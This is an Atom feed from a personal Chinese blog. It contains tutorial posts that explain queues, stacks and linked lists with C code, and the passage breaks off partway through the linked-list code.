<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chalnl&#39;s Blog</title>
  
  
  <link href="http://chalnl.com/atom.xml" rel="self"/>
  
  <link href="http://chalnl.com/"/>
  <updated>2022-10-05T11:16:32.249Z</updated>
  <id>http://chalnl.com/</id>
  
  <author>
    <name>Chalnl</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>数据结构之队列 - Queue</title>
    <link href="http://chalnl.com/post/d4b6632d.html/"/>
    <id>http://chalnl.com/post/d4b6632d.html/</id>
    <published>2022-10-03T16:00:00.000Z</published>
    <updated>2022-10-05T11:16:32.249Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="队列-Queue"><a href="#队列-Queue" class="headerlink" title="队列(Queue)"></a>队列(Queue)</h1><h2 id="队列基础知识"><a href="#队列基础知识" class="headerlink" title="队列基础知识"></a>队列基础知识</h2><h3 id="队列介绍"><a href="#队列介绍" class="headerlink" title="队列介绍"></a>队列介绍</h3><blockquote><p>队列是<strong>线性表</strong>的一种，在操作数据元素时，和栈一样，有自己的规则：使用队列存取数据元素时，数据元素<strong>只能从表的一端进入队列，另一端出队列</strong></p></blockquote><div align=center><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6tdze1atdj30mn05ggm3.jpg"/></div><blockquote><p>进入队列的一端为“<strong>队尾 - front</strong>”；出队列的一端为“<strong>队头 - rear</strong>”。数据元素全部由<strong>队尾陆续进队列</strong>，由<strong>队头陆续出队列</strong>。</p></blockquote><h3 id="先进先出原则"><a href="#先进先出原则" class="headerlink" title="先进先出原则"></a>先进先出原则</h3><ul><li>队列从一端存入数据，另一端调取数据的原则称为“先进先出”原则。</li></ul><blockquote><p>根据队列的先进先出原则，（a1,a2,a3,…,an）中，由于 a1 最先从队尾进入队列，所以可以最先从队头出队列，对于 a2 来说，只有 a1 出队之后，a2 才能出队</p></blockquote><h3 id="队列的实现方式"><a href="#队列的实现方式" class="headerlink" title="队列的实现方式"></a>队列的实现方式</h3><ul><li>队列的实现同样有两种方式：<strong>顺序存储</strong>和<strong>链式存储</strong>。</li></ul><blockquote><p>两者的区别同样在于数据元素在物理<strong>存储结构</strong>上的<strong>不同</strong>。</p></blockquote><h2 id="链式队列代码实现"><a href="#链式队列代码实现" class="headerlink" title="链式队列代码实现"></a>链式队列代码实现</h2><ol><li><p>结构体定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span> &#123;</span>        <span class="comment">//结点定义</span></span><br><span class="line">QElemType data;       <span class="comment">//数据存放</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QNode</span>* <span class="title">next</span>;</span>   <span class="comment">//指针指向下一个结点</span></span><br><span class="line">&#125;QNode, * QueuePtr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>              <span class="comment">//指针定义</span></span><br><span class="line">QueuePtr front;       <span class="comment">//头指针</span></span><br><span class="line">QueuePtr rear;        <span class="comment">//尾指针</span></span><br><span class="line">&#125;LinkQueue;</span><br></pre></td></tr></table></figure></li><li><p>初始化队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InitQueue</span><span class="params">(LinkQueue&amp; Q)</span> &#123;</span><br><span class="line">        <span class="comment">//申请结点空间</span></span><br><span class="line">Q.front = Q.rear = (QueuePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));</span><br><span class="line"><span class="keyword">if</span> (!Q.front)           <span class="comment">//申请失败</span></span><br><span class="line"><span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">Q.front-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>队列元素的插入<br><div align=center><img src=https://tva1.sinaimg.cn/large/008s52kYly1h6umejwy6nj30k105kdgg.jpg></div></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">EnQueue</span><span class="params">(LinkQueue&amp; Q, QElemType e)</span> &#123;</span><br><span class="line">QueuePtr p= (QueuePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));</span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">p-&gt;data = e;</span><br><span class="line">p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">Q.rear-&gt;next = p;</span><br><span class="line">Q.rear = p;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>队列元素的删除</p><div align=center><img src=https://tva1.sinaimg.cn/large/008s52kYly1h6umibregsj30k905vwfj.jpg></div></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">DeQueue</span><span class="params">(LinkQueue&amp; Q)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (Q.front == Q.rear)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">QueuePtr p = (QueuePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));</span><br><span class="line">p = Q.front-&gt;next; </span><br><span class="line">Q.front-&gt;next = p-&gt;next;</span><br><span class="line"><span class="keyword">if</span> (Q.rear == p)</span><br><span class="line">Q.rear = Q.front;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>销毁队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">DestroyQueue</span><span class="params">(LinkQueue&amp; Q)</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (Q.front) &#123;</span><br><span class="line">Q.rear = Q.front-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(Q.front);</span><br><span class="line">Q.front = Q.rear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>队列元素的输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">PrintQueue</span><span class="params">(LinkQueue&amp; Q)</span>&#123;</span><br><span class="line">QueuePtr p = (QueuePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));</span><br><span class="line"><span class="keyword">if</span> (Q.front == Q.rear)</span><br><span class="line"><span class="keyword">return</span> OVERFLOW;</span><br><span class="line">p = Q.front-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The LinkQueue is:\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (p != Q.rear-&gt;next) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>主函数的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n,e;</span><br><span class="line"><span class="type">char</span> chr;</span><br><span class="line">LinkQueue Q;</span><br><span class="line">InitQueue(Q);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the LinkQueue:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the element of the LinkQueue:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">EnQueue(Q, e);</span><br><span class="line">&#125;</span><br><span class="line">PrintQueue(Q);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWhether delete the front of the QNode:(y/n)\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;chr);</span><br><span class="line"><span class="keyword">if</span> (chr == <span class="string">&#x27;y&#x27;</span> || chr == <span class="string">&#x27;Y&#x27;</span>) </span><br><span class="line">DeQueue(Q);</span><br><span class="line">PrintQueue(Q);</span><br><span class="line">DestroyQueue(Q);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>结果展示<div align=center><img src=https://tva1.sinaimg.cn/large/008s52kYly1h6tfz6wb2mj30dh05njtb.jpg></div></li></ul><h3 id="LinkQueue-完整代码地址"><a href="#LinkQueue-完整代码地址" class="headerlink" title="LinkQueue 完整代码地址"></a><a href="http:\\chalnl.com\code\LinkQueue.cpp">LinkQueue 完整代码地址</a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="http://chalnl.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="数据结构" scheme="http://chalnl.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="队列" scheme="http://chalnl.com/tags/%E9%98%9F%E5%88%97/"/>
    
    <category term="C语言" scheme="http://chalnl.com/tags/C%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>数据结构之栈 - Stack</title>
    <link href="http://chalnl.com/post/87c7e7d.html/"/>
    <id>http://chalnl.com/post/87c7e7d.html/</id>
    <published>2022-09-30T16:00:00.000Z</published>
    <updated>2022-10-05T11:15:53.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="栈-Stack"><a href="#栈-Stack" class="headerlink" title="栈(Stack)"></a>栈(Stack)</h1><h2 id="栈的基础知识"><a href="#栈的基础知识" class="headerlink" title="栈的基础知识"></a>栈的基础知识</h2><ul><li>栈是一种“特殊”的<strong>线性存储结构</strong></li></ul><ol><li><p>元素<strong>进栈和出栈</strong>的操作<strong>只能从一端完成</strong>，另一端是封闭的。元素进栈的过程简称为“入栈”、“进栈”或者“压栈”；将元素出栈的过程简称为“出栈”或者“弹栈”</p><div align=center><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6pmzbd7fcj30ci01pq2z.jpg"/></div></li><li><p>栈中存数据和取数据，都遵循“<strong>先进后出</strong>”的原则，即最先入栈的元素最先出栈。<br>栈的开口端称为<strong>栈顶</strong>，封口端称为<strong>栈底</strong>。</p><div align=center><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6pn0ntdd3j303y06yjrf.jpg"/></div></li></ol><h2 id="顺序栈代码实现"><a href="#顺序栈代码实现" class="headerlink" title="顺序栈代码实现"></a>顺序栈代码实现</h2><ol><li><p>结构体定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">SElemType* top;      <span class="comment">//头指针，指向栈顶的上一个元素</span></span><br><span class="line">SElemType* base;     <span class="comment">//尾指针，指向栈底</span></span><br><span class="line"><span class="type">int</span> stacksize;       <span class="comment">//内存空间</span></span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure></li><li><p>初始化栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Initstack</span><span class="params">(SqStack&amp; s)</span> &#123;</span><br><span class="line">s.base = (SElemType*)<span class="built_in">malloc</span>(STACK_INIT_SIZE * <span class="keyword">sizeof</span>(SElemType)); </span><br><span class="line"><span class="keyword">if</span> (!s.base) </span><br><span class="line"><span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">s.top = s.base;        </span><br><span class="line">s.stacksize = STACK_INIT_SIZE; </span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p>进栈操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Push</span><span class="params">(SqStack&amp; s, SElemType e)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (s.top - s.base &gt;= s.stacksize)&#123;  <span class="comment">//满栈，增加内存空间</span></span><br><span class="line">s.base = (SElemType*)<span class="built_in">realloc</span>(s.base,(s.stacksize + STACKINCREMENT) * <span class="keyword">sizeof</span>(SElemType) ) ;</span><br><span class="line"><span class="keyword">if</span> (!s.base) </span><br><span class="line"><span class="built_in">exit</span>(OVERFLOW); </span><br><span class="line">s.top = s.base + s.stacksize; </span><br><span class="line">s.stacksize += STACKINCREMENT; </span><br><span class="line">&#125;</span><br><span class="line">* s.top++ = e;           <span class="comment">//*s.top=e --&gt; *s.top++</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p>出栈操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Pop</span><span class="params">(SqStack&amp; s)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (s.top == s.base)     <span class="comment">//判断是否为空栈</span></span><br><span class="line"><span class="keyword">return</span> ERROR; </span><br><span class="line">s.top--;</span><br><span class="line"><span class="comment">//printf(&quot;%d &quot;, * --s.top);</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>判断是否为空栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">StackEmpty</span><span class="params">(SqStack&amp; S)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (S.base == S.top) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The SqStack is Empty\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The SqStack is not Empty\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>输出栈中的元素</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">StackTraverse</span><span class="params">(SqStack&amp; S)</span> &#123;</span><br><span class="line">SElemType* p = S.top;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The SqStack is:\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (p &gt; S.base) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *--p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>将十进制数转换为八进制数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">conversion</span><span class="params">()</span> &#123;</span><br><span class="line">SqStack Sq;</span><br><span class="line">Initstack(Sq);</span><br><span class="line"><span class="type">int</span> N;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line"><span class="keyword">while</span> (N) &#123;</span><br><span class="line">Push(Sq,N % <span class="number">8</span>);</span><br><span class="line">N = N / <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The octal number is:\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (Sq.top &gt; Sq.base) </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, *--Sq.top);</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p>主函数实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n, e;</span><br><span class="line"><span class="type">char</span> chr;</span><br><span class="line">SqStack S;</span><br><span class="line">Initstack(S);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the SqStack:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the element of the SqStack:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">Push(S, e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Whether delete the top of the stack:(y/n)\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;chr);</span><br><span class="line"><span class="keyword">if</span> (chr == <span class="string">&#x27;y&#x27;</span> || chr == <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">Pop(S);</span><br><span class="line"></span><br><span class="line">StackEmpty(S);</span><br><span class="line">StackTraverse(S);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter a decimal number:\n&quot;</span>);</span><br><span class="line">conversion();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><strong>结果展示</strong><div align=center><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6pm1adf1oj30cu077wgw.jpg"/></div></li></ul><h3 id="SqStack-完整代码地址"><a href="#SqStack-完整代码地址" class="headerlink" title="SqStack 完整代码地址"></a><a href="http:\\chalnl.com\code\sqstack.cpp">SqStack 完整代码地址</a></h3><h2 id="栈的实际应用"><a href="#栈的实际应用" class="headerlink" title="栈的实际应用"></a>栈的实际应用</h2><ol><li><strong>实现浏览器的“回退”功能</strong><blockquote><p>浏览器的“回退”功能底层就是用栈存储结构实现的。</p></blockquote></li><li><p><strong>实现 C 语言函数的相互调用</strong></p><blockquote><p>C语言程序中，函数间的相互调用过程也是用栈存储结构实现的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello,World!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main() 函数先入栈，在第 5 行代码，将 func() 函数入栈。 func() 函数执行完后，func() 函数出栈，此时 main() 函数执行剩余代码， main() 函数执行完毕，出栈操作，程序执行结束。</p></blockquote></li><li><p><strong>解决一些实际问题</strong></p><blockquote><p>快速解决类似“进制转换”、“括号匹配”等问题</p></blockquote></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="http://chalnl.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="数据结构" scheme="http://chalnl.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="C语言" scheme="http://chalnl.com/tags/C%E8%AF%AD%E8%A8%80/"/>
    
    <category term="栈" scheme="http://chalnl.com/tags/%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>数据结构之链表 - LinkList</title>
    <link href="http://chalnl.com/post/4110bbe2.html/"/>
    <id>http://chalnl.com/post/4110bbe2.html/</id>
    <published>2022-09-18T16:00:00.000Z</published>
    <updated>2022-10-04T09:42:09.462Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="线性表的链式存储结构"><a href="#线性表的链式存储结构" class="headerlink" title="线性表的链式存储结构"></a>线性表的链式存储结构</h1><ul><li><strong>线性表（List）：零个或多个数据元素的有限序列</strong><br>线性表中的每一个元素有且<strong>只有一个直接前驱元素</strong>，除了最后一个元素an外，每一个元素有且<strong>只有一个直接后继元素</strong>。数据元素之间的关系是<strong>一对一的关系</strong>。</li></ul><p><img src="https://img-blog.csdnimg.cn/20210106171800118.png#pic_center" alt="img"></p><h2 id="一-链表"><a href="#一-链表" class="headerlink" title="一. 链表"></a>一. 链表</h2><h3 id="链表基础知识介绍"><a href="#链表基础知识介绍" class="headerlink" title="链表基础知识介绍"></a>链表基础知识介绍</h3><ul><li><p>链表由<strong>数据域</strong>和<strong>指针域</strong>构成<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h69m6wz7kwj306y01rwed.jpg" alt="image.png"></p></li><li><p>链表中<strong>头节点</strong>，<strong>头指针</strong>，<strong>首元节点</strong></p></li><li><strong>data</strong>储存数据，<strong>next</strong>指针指向下一个节点 ，双向链表中<strong>prev</strong>指向上一个节点</li></ul><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h69m0kv9nzj30a104ajrd.jpg" alt="2-1FG915025H28.png"></p><blockquote><p><strong>单链表中可以没有头结点，但是不能没有头指针</strong>！</p></blockquote><p><strong>头结点</strong>：有时，在链表的第一个结点之前会额外增设一个结点，结点的数据域一般不存放数据（有些情况下也可以存放链表的长度等信息），此结点被称为头结点。</p><blockquote><p>若头结点的指针域为空（NULL），表明链表是空表。头结点对于链表来说，不是必须的，在处理某些问题时，给链表添加头结点会使问题变得简单。</p></blockquote><p><strong>首元结点</strong>：链表中第一个元素所在的结点，它是头结点后边的第一个结点。</p><p><strong>头指针</strong>：永远指向链表中第一个结点的位置（如果链表有头结点，头指针指向头结点；否则，头指针指向首元结点）。</p><p><strong>头结点和头指针的区别</strong>：头指针是一个指针，头指针指向链表的头结点或者首元结点；头结点是一个实际存在的结点，它包含有数据域和指针域。两者在程序中的直接体现就是：头指针只声明而没有分配存储空间，头结点进行了声明并分配了一个结点的实际物理内存。</p><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6avvn7k2dj30go03j3yt.jpg" alt="image.png"></p><ul><li><h4 id="单链表代码实现"><a href="#单链表代码实现" class="headerlink" title="单链表代码实现"></a><strong>单链表代码实现</strong></h4></li></ul><ol><li>结构体的创建<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//链表中节点的结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> &#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br></pre></td></tr></table></figure></li><li>初始化链表<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6aw3gnlgjj30jg069ta2.jpg" alt="image.png"></li></ol><ul><li>尾插法创建链表<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_L</span><span class="params">(LinkList&amp; L, <span class="type">int</span> n)</span> &#123;          <span class="comment">//尾插发创建链表</span></span><br><span class="line">L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));     <span class="comment">//创建头结点</span></span><br><span class="line">L-&gt;next = <span class="literal">NULL</span>;                    </span><br><span class="line">LinkList temp = L;                       <span class="comment">//创建头指针  用于遍历</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">LinkList p = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));<span class="comment">//创建结点</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;p-&gt;data);           <span 